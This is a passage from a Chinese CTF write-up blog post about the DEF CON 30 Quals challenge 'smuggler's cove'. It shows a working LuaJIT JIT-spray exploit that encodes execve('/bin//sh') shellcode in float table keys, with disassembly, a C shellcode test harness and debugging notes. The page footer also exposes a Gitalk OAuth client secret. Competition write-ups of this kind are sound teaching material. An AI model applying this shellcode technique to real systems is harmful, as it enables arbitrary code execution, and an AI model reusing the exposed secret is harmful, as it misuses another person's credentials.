+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 一个大数</span></span><br><span class="line">num1 = <span class="number">0x112233445566</span></span><br><span class="line"><span class="built_in">print</span>(num1)        <span class="comment">-- 输出 18838586676582</span></span><br><span class="line">num1 = num1 + <span class="number">0.5</span></span><br><span class="line"><span class="comment">-- 输出时精度丢失</span></span><br><span class="line"><span class="built_in">print</span>(num1)        <span class="comment">-- 输出 18838586676583</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 超大数，输出浮点数表示法</span></span><br><span class="line">num1 = <span class="number">0x1122334455667788</span></span><br><span class="line"><span class="built_in">print</span>(num1)        <span class="comment">--输出 1.2346056164365e+18</span></span><br></pre></td></tr></table></figure>
+<p>现在尝试在 JIT Code 中部署特定值。由于 LuaJIT 启用了许多编译优化，例如 dead code elimination，因此<strong>在函数中创建数组对象后需要至少使用该对象一次</strong>，否则该对象将直接被删除。由于 print 函数实在是太难用了，因此换了种方法防止被优化。</p>
+<p>编写的测试 lua 代码如下：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">(arr)</span></span> </span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1.0</span>;</span><br><span class="line">    arr[<span class="number">1</span>] = <span class="number">2.0</span>;</span><br><span class="line">    arr[<span class="number">2</span>] = <span class="number">3.0</span>;</span><br><span class="line">    arr[<span class="number">3</span>] = <span class="number">4.0</span>;</span><br><span class="line">    arr[<span class="number">4</span>] = <span class="number">5.0</span>;</span><br><span class="line">    arr[<span class="number">5</span>] = <span class="number">6.0</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">func(arr)</span><br><span class="line">func(arr)</span><br><span class="line">cargo(func, <span class="number">0</span>)</span><br><span class="line">func(arr)</span><br></pre></td></tr></table></figure>
+<p>查看编译后的代码，发现生成的 JIT 代码无法满足要求，LuaJIT 会<strong>把等号后的数单独保存</strong>至其他内存位置，需要使用时再去加载：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830143407321.png" alt="image-20220830143407321"></p>
+<p>由于等号后边的内容再怎么便都无法改变被加载至其他内存的事实，因此我们可以尝试修改等号前面的<strong>属性内容</strong>，即 <code>arr[xxx] = _</code> 中的 <strong>xxx</strong>。</p>
+<p>在经过一番尝试后，发现属性如果是：</p>
+<ul>
+<li>
+<p>字符或字符串，则 JIT code 中会存在大量立即数，但是<strong>不可控</strong>。</p>
+</li>
+<li>
+<p>诸如 1.0、2.0、3.0 等<strong>整型且连续的浮点数</strong>，则所生成的 JIT Code 还是会和先前的 JIT code 一致。</p>
+</li>
+<li>
+<p><strong>不连续的浮点数</strong>，则所生成的代码将正是我们所需要的那种。例如以下 lua 代码：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">(arr)</span></span> </span><br><span class="line">    arr[<span class="number">1.0</span>] = <span class="number">1</span>;</span><br><span class="line">    arr[<span class="number">5.0</span>] = <span class="number">2</span>;</span><br><span class="line">    arr[<span class="number">21.0</span>] = <span class="number">3</span>;</span><br><span class="line">    arr[<span class="number">244.0</span>] = <span class="number">4</span>;</span><br><span class="line">    arr[<span class="number">21.0</span>] = <span class="number">5</span>;</span><br><span class="line">    arr[<span class="number">422.0</span>] = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">func(arr)</span><br><span class="line">func(arr)</span><br><span class="line">cargo(func, <span class="number">0</span>)</span><br><span class="line">func(arr)</span><br></pre></td></tr></table></figure>
+<p>所生成的 JIT Code：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830145419116.png" alt="image-20220830145419116"></p>
+</li>
+</ul>
+<p>这样一来，我们便可以达到<strong>在 JIT Code 上部署特定数据</strong>的目的，接下来便是编写 shellcode 并将其部署在 JIT Code 上，这个就是体力活了。</p>
+<blockquote>
+<p>这里需要推荐一个网站 <a href="https://tooltt.com/floatconverter/" target="_blank" rel="noopener">在线浮点数转二进制</a>，这个网站可以非常方便的<strong>转换浮点数与二进制</strong>。</p>
+</blockquote>
+<p>我编写的 exploit 如下所示（<strong>注意，这个 exp 存在亿点点问题</strong>）：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">(a)</span></span> </span><br><span class="line">    a[<span class="number">1.2015822066494834e-135</span>] = <span class="number">1</span>; <span class="comment">-- 4831f6 4889f2 ebxx  0x(23ebf28948f63148)</span></span><br><span class="line">    a[<span class="number">1.888017891495551e-193</span>] = <span class="number">2</span>; <span class="comment">-- 4889f1 56 9090 ebxx 0x(17eb909056f18948)</span></span><br><span class="line">    a[<span class="number">1.8732669152797884e-193</span>] = <span class="number">3</span>; <span class="comment">-- 682f62696e 59 ebxx 0x(17eb596e69622f68)</span></span><br><span class="line">    a[<span class="number">1.8748660135882913e-193</span>] = <span class="number">4</span>; <span class="comment">-- 682f2f7368 5f ebxx 0x(17eb5f68732f2f68)</span></span><br><span class="line">    a[<span class="number">1.8880176708811596e-193</span>] = <span class="number">5</span>; <span class="comment">-- 48c1e720 9090 ebxx 0x(17eb909020e7c148)</span></span><br><span class="line">    a[<span class="number">2.383013609192317e-222</span>] = <span class="number">6</span>; <span class="comment">-- 4809cf 57 9090 ebxx 0x(11eb909057cf0948)</span></span><br><span class="line">    a[<span class="number">1.872946064693589e-193</span>] = <span class="number">7</span>; <span class="comment">-- 4889e7 6a3b 58 ebxx 0x(17eb583b6ae78948)</span></span><br><span class="line">    a[<span class="number">1.8880178917328522e-193</span>] = <span class="number">8</span>; <span class="comment">-- 99 6a00 57 9090 ebxx 0x(17eb909057006a99)</span></span><br><span class="line">    a[<span class="number">-2.4120921044623575e+255</span>] = <span class="number">9</span>; <span class="comment">-- 4889e6 0f05 90 f4f4 0x(f4f490050fe68948)</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">a = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">f(a)</span><br><span class="line">f(a)</span><br><span class="line">cargo(f, <span class="number">0x80</span>)</span><br><span class="line">f(a)</span><br></pre></td></tr></table></figure>
+<p>其实际执行的 shellcode 为：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">4831f6        xor %rsi, %rsi</span><br><span class="line">4889f2        mov %rdx, %rsi</span><br><span class="line">4889f1        mov %rcx, %rsi</span><br><span class="line"></span><br><span class="line">56            push %rsi</span><br><span class="line">682f62696e    push 0x6e69622f</span><br><span class="line">59            pop rcx</span><br><span class="line">682f2f7368    push 0x68732f2f</span><br><span class="line">5f            pop rdi</span><br><span class="line">48c1e720      shl %rdi, 32</span><br><span class="line">4809cf        or %rdi, %rcx</span><br><span class="line">57            push %rdi</span><br><span class="line">4889e7        mov %rdi, %rsp</span><br><span class="line"></span><br><span class="line">6a3b          push 0x3b</span><br><span class="line">58            pop %rax</span><br><span class="line">99            cltd</span><br><span class="line"></span><br><span class="line">6a00          push 0</span><br><span class="line">57            push %rdi</span><br><span class="line">4889e6        mov %rsi, %rsp</span><br><span class="line"></span><br><span class="line">0f05          syscall</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：<code>jmp rel8</code> 的机器码为 <code>eb</code>。</p>
+</blockquote>
+<p>这里就快执行 <code>SYS_execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], NULL)</code> 了（mcode + 0x181）：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830202644199.png" alt="image-20220830202644199"></p>
+<p>但比较奇怪的是，sh 直接退出了：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830202913401.png" alt="image-20220830202913401"></p>
+<p>但我手动写了个代码尝试复现：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* path = <span class="string">"/bin//sh"</span>;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123; path, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(path, argv, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是复现失败了：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830203612583.png" alt="image-20220830203612583"></p>
+<p>即便是直接执行 shellcode：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* shellcode = <span class="string">"\x48\x31\xf6\x48\x89\xf2\x48\x89\xf1\x56\x68\x2f\x62"</span></span><br><span class="line">                  <span class="string">"\x69\x6e\x59\x68\x2f\x2f\x73\x68\x5f\x48\xc1\xe7\x20\x48"</span></span><br><span class="line">                  <span class="string">"\x09\xcf\x57\x48\x89\xe7\x6a\x3b\x58\x99\x6a\x00\x57\x48\x89\xe6\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// char* path = "/bin//sh";</span></span><br><span class="line">    <span class="comment">// char* argv[] = &#123; path, NULL &#125;;</span></span><br><span class="line">    <span class="comment">// execve(path, argv, NULL);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="built_in">buffer</span>, shellcode, <span class="number">50</span>);</span><br><span class="line">    <span class="keyword">void</span> (*scfunc)() = <span class="built_in">buffer</span>;</span><br><span class="line">    scfunc();</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也无法复现这种 <code>/bin/sh</code> 直接退出的情况：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830204619529.png" alt="image-20220830204619529"></p>
+<p>百思不得其解。于是用 gdb 的 <code>catch exec</code> 指令，进入被调用的 dash 子进程开始调试，最后才发现原来是因为 <strong>stdin 被关闭了</strong>（捂脸）：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830214854162.png" alt="image-20220830214854162"></p>
+<p>反过来才发现，cove 代码中其实早有说明，但是当时就是给漏看了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_code</span><span class="params">(lua_State* L, <span class="keyword">char</span>* path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> max_size = MAX_SIZE;</span><br><span class="line">    <span class="keyword">char</span>* code = <span class="built_in">calloc</span>(max_size+<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    FILE* f = fopen(path,<span class="string">"r"</span>);</span><br><span class="line">    ...</span><br><span class="line">    fseek(f, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = ftell(f);</span><br><span class="line">    ...</span><br><span class="line">    fseek(f, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    fread(code, <span class="number">1</span>, <span class="built_in">size</span>, f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里！stdin 被关闭</span></span><br><span class="line">    fclose(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = luaL_dostring(L, code);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Lua error: %s\n"</span>, lua_tostring(L, <span class="number">-1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>麻了，只能说还是自己观察的不够细致，踩了个坑。</p>
+<p>本题复盘结束，完结撒花！</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2022/08/defcon30quals_smugglers_cove/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/10/dirty-cred/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            浅析 Linux Dirty Cred 新型漏洞利用方式
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/08/defcon30quals_constricted/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Defcon-30-Quals rust-pwn constricted 复盘笔记</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
